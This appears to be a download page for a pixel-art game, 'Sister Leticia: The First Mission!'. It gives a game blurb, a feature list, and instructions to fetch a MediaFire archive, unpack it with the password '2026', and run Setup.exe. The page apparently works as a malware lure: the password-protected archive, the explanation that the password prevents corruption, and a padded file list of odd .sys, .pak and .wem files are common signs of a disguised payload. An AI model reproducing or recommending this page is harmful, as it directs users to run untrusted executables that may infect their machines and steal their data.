## 🕹️ About

Sister Leticia: The First Mission! is a 2D side-scrolling action-adventure game developed by Cyatt Cafe and published by Mango Party for Windows PC. Released on September 16, 2026, it follows rookie nun Leticia as she investigates a monastery that has lost contact with the outside world and discovers a village overrun by monsters. Players explore six areas, rescue victims, battle enemies with a sacred staff and firearms, and face challenging bosses. Its pixel-art presentation, comedic dialogue, voice acting, adult themes, and compact arcade-like structure give the adventure a distinctive identity.

A short, accessible action adventure for players who enjoy pixel-art side scrollers, anime-inspired characters, comedic dialogue, and mature fantasy themes.

## ✨ Features

- 🖼️ **Gallery Content** — Unlock additional artwork and collectible scenes as the adventure progresses.
- 🗺️ **Six Dangerous Areas** — Explore connected stages filled with enemies, victims, secrets, and boss encounters.
- 💬 **Comedic Storytelling** — Follow Leticia's unlucky mission through lighthearted dialogue and fully voiced character moments.
- 👾 **Pixel-Art Enemies** — Battle a variety of enemy types, each with distinct attack patterns and animations.
- ⚔️ **Side-Scrolling Combat** — Fight monsters with Leticia's sacred staff, pistol, and powerful rifle.

### Step 1: Download

Download the game files from **[this page](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)**.

### Step 2: Extract

1. Use any standard archive extractor (7-Zip, WinRAR, WinZip, etc.)
2. The archive is protected with the password **`2026`** to prevent corruption during transfer
3. Extract **all files** into a single folder of your choice
4. Do not rename or move individual files — the game expects its folder structure intact

The extracted folder should look like this:

```
Setup/
|-- Setup.exe <- Main executable
|-- update_1.ini <- Update config
|-- installer.dat <- Installer data
|-- Password 2026.txt <- Password reminder (empty)
|-- animations.dll <- Animation system
|-- settings.bin <- Configuration
|-- lang.sys <- Language system
|-- license.wem <- Audio assets
|-- patch_1.bnk <- Audio banks
|-- localization.ini <- Language files
|-- audio.res <- Audio resources
|-- uninstall.key <- Uninstall key
|-- scripts.lic <- Game scripts
|-- update_1.res <- Update resources
|-- license.bank <- License data
|-- api.pak <- API modules
|-- assets.wem <- Asset audio
|-- bootstrap.wem <- Bootstrap audio
|-- dlc.md5 <- DLC checksums
|-- launcher.dll <- Launcher library
|-- res.pak <- Resources archive
|-- driver.pak <- Driver archive
|-- driver.umap <- Driver data
|-- physics.sys <- Physics engine
|-- global.cfg <- Global settings
```

### Step 3: Launch

1. Open the extracted folder
2. Run `Setup.exe`
3. The game will start
